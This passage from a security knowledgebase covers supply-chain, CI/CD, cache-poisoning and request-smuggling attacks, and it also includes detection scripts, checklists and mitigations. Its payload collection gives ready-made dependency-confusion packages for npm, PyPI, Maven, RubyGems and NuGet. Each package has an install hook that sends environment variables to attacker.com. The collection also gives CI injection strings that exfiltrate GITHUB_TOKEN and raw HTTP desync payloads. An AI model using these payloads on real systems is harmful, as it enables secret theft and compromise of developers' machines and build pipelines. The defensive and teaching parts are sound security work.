 | 24M+ sites vulnerable to H2.0 desync |

### 25.2 OWASP Software Assurance Maturity Model (SAMM)

**SAMM 2.0 Supply Chain Security Practices**:

| Practice | Maturity Level 1 | Maturity Level 2 | Maturity Level 3 |
|----------|-----------------|-----------------|-----------------|
| **Secure Build** | Build process is defined and documented | Build environment is hardened and monitored | Reproducible builds with signed artifacts |
| **Dependency Management** | Inventory of dependencies maintained | Automated vulnerability scanning | Automated remediation and SBOM generation |
| **Secure Deployment** | Deployment process is defined and documented | Deployment pipeline is automated and audited | Blue-green/canary deployments with rollback |

### 25.3 SLSA Framework (Supply-chain Levels for Software Artifacts)

**SLSA Levels**:

| Level | Description | Requirements |
|-------|-------------|------------|
| **1** | Basic security | Build process documented, provenance generated |
| **2** | Basic signing | Signed provenance, hosted build service |
| **3** | Hardened build | Isolated builds, hermetic builds, reproducible builds |
| **4** | Maximum security | Two-person review, reproducible builds, sealed builds |

**SLSA Provenance Attestation**:
```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "predicate": {
    "builder": {
      "id": "https://github.com/org/repo/.github/workflows/build.yml@refs/heads/main"
    },
    "buildType": "https://github.com/slsa-framework/github-actions-buildtypes/workflow/v1",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/org/repo@refs/heads/main",
        "digest": {
          "sha1": "abc123..."
        },
        "entryPoint": ".github/workflows/build.yml"
      }
    },
    "metadata": {
      "buildInvocationId": "https://github.com/org/repo/actions/runs/123456789",
      "completeness": {
        "parameters": true,
        "environment": true,
        "materials": true
      }
    }
  }
}
```

---

## 26. Bug Bounty Writeups

### 26.1 Dependency Confusion Bounties

**Alex Birsan's Research (2021)**:
```
Target: Apple, Microsoft, Netflix, Uber, Shopify, Tesla, Yelp
Method: Dependency confusion via npm, PyPI, RubyGems
Result: $130,000+ in bug bounties
Key Finding: 35+ companies vulnerable
Writeup: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
```

**Key Takeaways for Bug Bounty Hunters**:
```
1. Enumerate internal package names from public repos
2. Check if internal packages exist on public registries
3. If not, publish with high version number
4. Include preinstall hook for notification
5. Report responsibly - DO NOT exfiltrate real data
```

### 26.2 CI/CD Injection Bounties

**GitHub Actions Workflow Injection**:
```
Researcher: Various
Method: PR title/body injection in workflows
Impact: GITHUB_TOKEN exfiltration, repository compromise
Bounty Range: $500-$10,000+
Key Platforms: GitHub, GitLab, Bitbucket
```

**Example Report Structure**:
```
Title: CI/CD Pipeline - Workflow Injection via PR Title
Severity: Critical
Description: The repository's CI workflow interpolates untrusted PR titles
into shell commands without sanitization, allowing arbitrary command execution.

Proof of Concept:
1. Fork repository
2. Create PR with title: `"; curl https://attacker.com?token=$GITHUB_TOKEN; echo "`
3. Workflow triggers and exfiltrates token
4. Token has write access to repository

Impact:
- Arbitrary code execution in CI environment
- Secret exfiltration (GITHUB_TOKEN, AWS credentials, etc.)
- Repository modification and backdoor injection

Remediation:
- Use environment variables for untrusted input
- Implement input validation
- Use least-privilege permissions for GITHUB_TOKEN
```

### 26.3 Cache Poisoning Bounties

**PortSwigger Research Applied**:
```
Researcher: James Kettle
Method: Web cache poisoning via unkeyed inputs
Impact: XSS, data exfiltration, account takeover
Bounty Range: $1,000-$20,000+
Key Platforms: Cloudflare, Akamai, Fastly
```

**Cache Poisoning Report Template**:
```
Title: Web Cache Poisoning via X-Forwarded-Host
Severity: High
Description: The application uses X-Forwarded-Host header to construct
URLs in responses without proper validation, allowing cache poisoning.

Proof of Concept:
1. Send request with X-Forwarded-Host: attacker.com
2. Response contains <script src="https://attacker.com/script.js">
3. Response is cached by CDN
4. All subsequent users load attacker's script

Impact:
- Stored XSS affecting all users
- Session hijacking
- Credential theft
- Supply chain compromise via poisoned CDN

Remediation:
- Do not use unkeyed headers in response generation
- Implement proper cache key configuration
- Validate and sanitize all inputs
```

### 26.4 Request Smuggling Bounties

**Client-Side Desync (CSD)**:
```
Researcher: James Kettle
Target: amazon.com (2022)
Method: H2.0 desync via browser-compatible attack
Impact: Request hijacking, stored victim data
Bounty: $10,000+
```

**Cloudflare Internal Desync (2025)**:
```
Researchers: James Kettle, Wannes Verwimp
Impact: 24,000,000+ websites
Method: H2.0 desync internal to Cloudflare
Result: Complete site takeover via poisoned cache
Bounty: $10,000+
```

---

## 27. Payload Collections

### 27.1 Dependency Confusion Payloads by Language

**npm (Node.js)**:
```json
{
  "name": "@targetcompany/internal-utils",
  "version": "999.9.9",
  "description": "Internal utilities - DO NOT USE",
  "main": "index.js",
  "scripts": {
    "preinstall": "node -e "require('child_process').exec('curl -X POST https://attacker.com/npm-exfil -d ' + Buffer.from(JSON.stringify(process.env)).toString('base64'))"",
    "postinstall": "node payload.js"
  }
}
```

**PyPI (Python)**:
```python
# setup.py
import os
import subprocess
from setuptools import setup

def exfiltrate():
    try:
        env = os.environ
        subprocess.run([
            'curl', '-X', 'POST',
            'https://attacker.com/pypi-exfil',
            '-d', str(env)
        ], timeout=5)
    except:
        pass

exfiltrate()

setup(
    name='targetcompany-internal',
    version='999.0.0',
    packages=['targetcompany_internal']
)
```

**Maven (Java)**:
```xml
<!-- pom.xml -->
<project>
  <groupId>com.targetcompany</groupId>
  <artifactId>internal-lib</artifactId>
  <version>999.9.9</version>

  <build>
    <plugins>
      <plugin>
        <groupId>org.codehaus.mojo</groupId>
        <artifactId>exec-maven-plugin</artifactId>
        <version>3.0.0</version>
        <executions>
          <execution>
            <phase>validate</phase>
            <goals><goal>exec</goal></goals>
            <configuration>
              <executable>sh</executable>
              <arguments>
                <argument>-c</argument>
                <argument>env | curl -X POST -d @- https://attacker.com/maven-exfil</argument>
              </arguments>
            </configuration>
          </execution>
        </executions>
      </plugin>
    </plugins>
  </build>
</project>
```

**RubyGems (Ruby)**:
```ruby
# gemspec
Gem::Specification.new do |spec|
  spec.name = 'targetcompany-internal'
  spec.version = '999.0.0'
  spec.extensions = ['ext/payload/extconf.rb']
end

# ext/payload/extconf.rb
require 'mkmf'
require 'net/http'
require 'uri'

uri = URI.parse('https://attacker.com/gem-exfil')
Net::HTTP.post_form(uri, {
  'env' => ENV.to_h.to_json,
  'hostname' => `hostname`
})

create_makefile('payload')
```

**NuGet (.NET)**:
```xml
<!-- .nuspec -->
<?xml version="1.0"?>
<package>
  <metadata>
    <id>TargetCompany.Internal</id>
    <version>999.0.0</version>
  </metadata>
  <files>
    <file src="tools\init.ps1" target="tools\init.ps1" />
  </files>
</package>
```

```powershell
# tools/init.ps1
$envData = Get-ChildItem Env: | ConvertTo-Json
Invoke-WebRequest -Uri "https://attacker.com/nuget-exfil" -Method POST -Body @{ env = $envData }
```

### 27.2 CI/CD Injection Payloads

**GitHub Actions PR Title Injection**:
```
"; curl https://attacker.com?token=$GITHUB_TOKEN; echo "
$(whoami)
`curl https://attacker.com`
${IFS}curl${IFS}https://attacker.com
```

**GitLab CI Variable Injection**:
```yaml
# In .gitlab-ci.yml or via API
variables:
  MALICIOUS: "; curl https://attacker.com; echo "
```

**Jenkins Pipeline Injection**:
```groovy
// In Jenkinsfile
sh "echo ${env.MALICIOUS_INPUT}"  // VULNERABLE
```

### 27.3 Cache Poisoning Payloads

**X-Forwarded-Host Poisoning**:
```http
GET /api/config HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response:
{
  "cdn_url": "https://evil.com/assets",
  "api_endpoint": "https://evil.com/api"
}
```

**X-Original-URL Cache Key Bypass**:
```http
GET /static/app.js HTTP/1.1
Host: target.com
X-Original-URL: /admin/secret.js

# Cache stores /static/app.js with content of /admin/secret.js
```

### 27.4 Request Smuggling Payloads

**CL.TE Classic**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /admin HTTP/1.1
Host: target.com

0

```

**TE.CL Classic**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**CL.0 Desync**:
```http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Length: 41

GET /admin HTTP/1.1
Host: target.com

```

**H2.TE Desync**:
```
HTTP/2 request:
:method POST
:path /
:authority target.com

Body (chunked when downgraded):
5c
GET /admin HTTP/1.1
Host: target.com

0

```

**Expect-Based Desync**:
```http
POST /endpoint HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 5

xxxxxGET /admin HTTP/1.1
X: Y
```

---

## 28. Detection Techniques

### 28.1 Dependency Confusion Detection

**Registry Monitoring**:
```bash
# Monitor npm registry for company packages
npm search @company --json | jq '.[].name'

# Check if package exists on public registry
curl -s https://registry.npmjs.org/@company%2finternal-package | jq '.versions | keys'

# Set up alerts for new package publications
# Use npm's webhook API or registry monitoring tools
```

**CI/CD Detection**:
```yaml
# GitHub Actions workflow to detect dependency confusion
name: Dependency Confusion Detection
on:
  schedule:
    - cron: '0 0 * * *'  # Daily

jobs:
  detect:
    runs-on: ubuntu-latest
    steps:
      - name: Check public registries
        run: |
          for pkg in $(cat internal-packages.txt); do
            status=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
            if [ "$status" == "200" ]; then
              echo "ALERT: $pkg found on public registry!"
            fi
          done
```

### 28.2 CI/CD Anomaly Detection

**Workflow Change Detection**:
```bash
# Monitor for workflow file changes
git log --all --oneline -- .github/workflows/ | head -20

# Alert on new workflow files
git diff --name-only HEAD~1 HEAD | grep '.github/workflows'
```

**Secret Usage Monitoring**:
```bash
# Monitor for unexpected secret usage
# Use GitHub Audit Log API
curl -H "Authorization: token $TOKEN"   https://api.github.com/orgs/org/audit-log?phrase=secret_access
```

### 28.3 Cache Poisoning Detection

**Cache Key Analysis**:
```bash
# Identify unkeyed inputs
# Use Param Miner (Burp Suite extension)
# Or manual testing with cache-buster parameters

# Test for cache poisoning
curl -H "X-Forwarded-Host: evil.com" "https://target.com/page?cb=1"
curl "https://target.com/page?cb=2"  # Check if poisoned
```

**Response Analysis**:
```python
# Script to detect cache poisoning
import requests

def test_cache_poisoning(url):
    # Test with poisoned header
    headers = {'X-Forwarded-Host': 'evil.com'}
    r1 = requests.get(url, headers=headers)

    # Test without poisoned header
    r2 = requests.get(url)

    # Compare responses
    if 'evil.com' in r2.text:
        print(f"[VULNERABLE] {url} - Cache poisoning detected")
    else:
        print(f"[SAFE] {url}")
```

### 28.4 Request Smuggling Detection

**Desync Probe Script**:
```python
import requests
import socket
import ssl

def test_cl_te(host, port=443):
    context = ssl.create_default_context()
    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            # Send CL.TE probe
            request = (
                "POST / HTTP/1.1
"
                f"Host: {host}
"
                "Content-Length: 4
"
                "Transfer-Encoding: chunked
"
                "
"
                "5c
"
                "GET /admin HTTP/1.1
"
                f"Host: {host}
"
                "
"
                "0
"
                "
"
            )
            ssock.send(request.encode())
            response = ssock.recv(4096).decode()

            if "400" in response or "error" in response.lower():
                return True
    return False
```

---

## 29. References

### 29.1 Primary Sources

| Source | URL | Key Content |
|--------|-----|-------------|
| **PortSwigger Research** | https://portswigger.net/research | Web cache poisoning, request smuggling, browser-powered desync |
| **OWASP A08:2021** | https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/ | Official OWASP definition and mitigations |
| **HackTricks** | https://book.hacktricks.wiki/en/pentesting-web/dependency-confusion.html | Dependency confusion techniques |
| **MDN SRI** | https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity | Subresource Integrity documentation |
| **GitHub Security** | https://docs.github.com/en/actions/security-guides | GitHub Actions security hardening |
| **GitLab Security** | https://docs.gitlab.com/ee/ci/pipeline_security/ | GitLab CI/CD security |
| **OpenSSF Scorecard** | https://github.com/ossf/scorecard | Supply chain security metrics |
| **SLSA Framework** | https://github.com/slsa-framework/slsa | Supply chain levels for software artifacts |
| **Sigstore/Cosign** | https://github.com/sigstore/cosign | Container signing and verification |

### 29.2 Tool Repositories

| Tool | Repository | Purpose |
|------|-----------|---------|
| **TruffleHog** | https://github.com/trufflesecurity/trufflehog | Secret scanning |
| **Gitleaks** | https://github.com/gitleaks/gitleaks | Git secret detection |
| **Trivy** | https://github.com/aquasecurity/trivy | Multi-scanner (vulns, secrets, SBOM) |
| **Syft** | https://github.com/anchore/syft | SBOM generation |
| **Grype** | https://github.com/anchore/grype | Vulnerability scanning |
| **Nuclei** | https://github.com/projectdiscovery/nuclei | Vulnerability scanner |
| **HTTP Request Smuggler** | https://github.com/PortSwigger/http-request-smuggler | Desync detection |
| **pp-finder** | https://github.com/BlackFan/client-side-prototype-pollution | Prototype pollution |
| **PayloadsAllTheThings** | https://github.com/swisskyrepo/PayloadsAllTheThings | Payload collection |
| **ysoserial** | https://github.com/frohoff/ysoserial | Java deserialization payloads |

### 29.3 Bug Bounty Resources

| Resource | URL | Description |
|----------|-----|-------------|
| **HackerOne Hacktivity** | https://hackerone.com/hacktivity | Public bug bounty reports |
| **Bugcrowd University** | https://www.bugcrowd.com/hackers/ | Bug bounty training |
| **PortSwigger Web Security Academy** | https://portswigger.net/web-security | Free web security training |
| **OWASP Cheat Sheet Series** | https://cheatsheetseries.owasp.org/ | Security cheat sheets |

### 29.4 Research Papers

| Paper | Author | Year | Key Finding |
|-------|--------|------|-------------|
| **Dependency Confusion** | Alex Birsan | 2021 | $130K+ bug bounties via dependency confusion |
| **Practical Web Cache Poisoning** | James Kettle | 2018 | Unkeyed inputs as cache poisoning vectors |
| **Browser-Powered Desync Attacks** | James Kettle | 2022 | Browser-compatible request smuggling |
| **HTTP/2: The Sequel** | James Kettle | 2023 | H2 downgrade desync |
| **HTTP/1.1 Must Die** | James Kettle | 2024 | Parser discrepancy detection |
| **Cloudflare Internal Desync** | James Kettle, Wannes Verwimp | 2025 | 24M+ sites vulnerable |

### 29.5 Standards and Frameworks

| Standard | URL | Description |
|----------|-----|-------------|
| **CycloneDX** | https://cyclonedx.org/ | SBOM standard |
| **SPDX** | https://spdx.dev/ | Software package data exchange |
| **SLSA** | https://slsa.dev/ | Supply chain levels |
| **in-toto** | https://in-toto.io/ | Software supply chain security |
| **Sigstore** | https://www.sigstore.dev/ | Software signing and transparency |

---

## Appendix A: Quick Reference Cards

### A.1 Dependency Confusion Checklist

```
[ ] Enumerate internal package names from public repos
[ ] Check npm registry for @company packages
[ ] Check PyPI for company-named packages
[ ] Check Maven Central for com.company artifacts
[ ] Check RubyGems, NuGet, Go proxy
[ ] Verify registry priority configuration
[ ] Check for namespace reservation
[ ] Test with high version number
[ ] Monitor for unauthorized publications
```

### A.2 CI/CD Security Checklist

```
[ ] Pin actions to commit SHA (not tags/branches)
[ ] Use least-privilege GITHUB_TOKEN permissions
[ ] Sanitize all untrusted inputs in workflows
[ ] Use environment variables for sensitive data
[ ] Enable branch protection rules
[ ] Require signed commits
[ ] Use OIDC for cloud credentials (not long-lived secrets)
[ ] Monitor workflow changes
[ ] Scan for secrets in repository history
[ ] Use self-hosted runners with restricted access
```

### A.3 Cache Poisoning Checklist

```
[ ] Identify all cache layers (CDN, reverse proxy, application)
[ ] Test for unkeyed inputs (headers, cookies)
[ ] Check Vary header configuration
[ ] Test cache key injection (X-Original-URL, etc.)
[ ] Verify cache invalidation mechanisms
[ ] Test for cache deception vulnerabilities
[ ] Monitor for unexpected cached responses
```

### A.4 Request Smuggling Checklist

```
[ ] Test for CL.TE desync
[ ] Test for TE.CL desync
[ ] Test for CL.0 desync
[ ] Test for H2.TE/H2.CL desync
[ ] Test for Expect-based desync
[ ] Check for parser discrepancies (HTTP/1.1 Must Die)
[ ] Test browser-compatible attacks (CSD)
[ ] Verify front-end/back-end consistency
[ ] Check for HTTP/2 downgrade issues
```

---

## Appendix B: Common Misconfigurations

### B.1 npm .npmrc Misconfigurations

```
# VULNERABLE: No registry priority
registry=https://registry.npmjs.org

# SECURE: Scoped registry with priority
@company:registry=https://private.registry.com
registry=https://registry.npmjs.org

# VULNERABLE: Credentials in .npmrc
//registry.npmjs.org/:_authToken=npm_xxxxxxxx

# SECURE: Use environment variables
//registry.npmjs.org/:_authToken=${NPM_TOKEN}
```

### B.2 GitHub Actions Misconfigurations

```yaml
# VULNERABLE: Untrusted input interpolation
- run: echo "${{ github.event.pull_request.title }}"

# SECURE: Use environment variable
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"

# VULNERABLE: Mutable action reference
- uses: actions/checkout@v3

# SECURE: Immutable commit SHA
- uses: actions/checkout@a12a3943b4bdde767164f792f33f40b04645d846

# VULNERABLE: Overly permissive token
permissions: write-all

# SECURE: Least privilege
permissions:
  contents: read
  checks: write
```

### B.3 GitLab CI Misconfigurations

```yaml
# VULNERABLE: Remote include
include:
  - remote: 'https://example.com/template.yml'

# SECURE: Local or pinned include
include:
  - local: '/templates/build.yml'
  - project: 'group/project'
    ref: abc123...
    file: '/templates/build.yml'

# VULNERABLE: Mutable image tag
image: node:latest

# SECURE: Immutable digest
image: node@sha256:abc123...
```

### B.4 Docker Misconfigurations

```dockerfile
# VULNERABLE: Latest tag
FROM node:latest

# SECURE: Specific version
FROM node:18.17.1-alpine3.18

# VULNERABLE: No signature verification
RUN curl -sSL https://example.com/script.sh | bash

# SECURE: Verify before execution
RUN curl -sSL -o script.sh https://example.com/script.sh &&     echo "expected_sha256  script.sh" | sha256sum -c - &&     bash script.sh
```

---

## Appendix C: Mitigation Strategies

### C.1 Dependency Confusion Mitigation

```
1. Namespace Reservation
   - Register @company scope on npm
   - Register com.company on Maven Central
   - Use private registries with strict access control

2. Registry Priority Configuration
   - Configure scoped registries first
   - Use npmrc/pip.conf/maven settings.xml
   - Implement registry fallback policies

3. Dependency Pinning
   - Use lock files (package-lock.json, Pipfile.lock)
   - Pin to specific versions (not ranges)
   - Verify checksums/sha256 of downloaded packages

4. Monitoring
   - Monitor public registries for company names
   - Set up alerts for new package publications
   - Regular audit of dependency tree
```

### C.2 CI/CD Security Mitigation

```
1. Workflow Security
   - Pin actions to commit SHA
   - Use least-privilege permissions
   - Sanitize all untrusted inputs
   - Use environment variables for sensitive data

2. Secret Management
   - Use secret scanning (TruffleHog, Gitleaks)
   - Rotate secrets regularly
   - Use OIDC for cloud credentials
   - Never log secrets or echo them

3. Runner Security
   - Use ephemeral runners (GitHub-hosted)
   - Isolate self-hosted runners
   - Restrict runner access to specific repositories
   - Monitor runner activity

4. Audit and Monitoring
   - Enable GitHub Audit Log
   - Monitor workflow changes
   - Alert on anomalous CI activity
   - Regular security reviews of pipelines
```

### C.3 Cache Poisoning Mitigation

```
1. Cache Configuration
   - Properly configure cache keys
   - Include all relevant headers in cache key
   - Use Vary header correctly
   - Implement cache invalidation

2. Input Validation
   - Validate all headers before using in responses
   - Reject unexpected headers
   - Use allowlists for header values
   - Normalize inputs

3. Response Security
   - Don't reflect user input in responses
   - Use Content-Type headers correctly
   - Implement CSP headers
   - Use SRI for external resources

4. Monitoring
   - Monitor cache hit/miss ratios
   - Alert on unexpected cached responses
   - Regular cache content audits
   - Test cache behavior after deployments
```

### C.4 Request Smuggling Mitigation

```
1. Front-End Configuration
   - Reject ambiguous requests
   - Normalize Content-Length and Transfer-Encoding
   - Use consistent parsing across layers
   - Implement request size limits

2. Back-End Configuration
   - Reject requests with both CL and TE
   - Use strict HTTP parsing
   - Implement connection pooling best practices
   - Monitor for anomalous request patterns

3. Architecture
   - Use HTTP/2 end-to-end (no downgrade)
   - Implement proper proxy chains
   - Use load balancers with desync protection
   - Regular security testing of proxy chains

4. Detection
   - Monitor for 400 errors from smuggling probes
   - Alert on anomalous request patterns
   - Regular penetration testing
   - Use automated desync detection tools
```

---

*End of Knowledgebase*

> **Disclaimer**: This knowledgebase is for educational and authorized security testing purposes only. All techniques described should only be used on systems you own or have explicit written permission to test. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and similar laws worldwide.

> **Last Updated**: 2025-05-24
> **Version**: 1.0
> **License**: CC BY-SA 4.0
